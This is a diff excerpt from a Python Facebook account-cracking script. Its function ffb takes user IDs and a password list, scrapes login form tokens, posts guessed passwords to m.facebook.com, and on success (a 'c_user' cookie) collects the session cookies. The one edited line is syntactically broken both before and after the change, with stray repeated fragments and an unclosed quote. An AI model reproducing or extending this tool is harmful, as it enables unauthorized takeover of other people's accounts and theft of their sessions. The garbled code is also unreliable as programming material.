@@ -488,7 +488,7 @@ def ffb(ids,names,passlist):
 }
                         getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post('https://m.facebook.com/', cookies=cookies, headers=headers)com/', cookies=
+                        complete = session.post('https://m.facebook.com/', cookies=cookies, headers=headers)com/', cookies=cookies, headers=headers')
                         SILENT=session.cookies.get_dict().keys()
                         if "c_user" in SILENT:
                                 coki=session.cookies.get_dict()
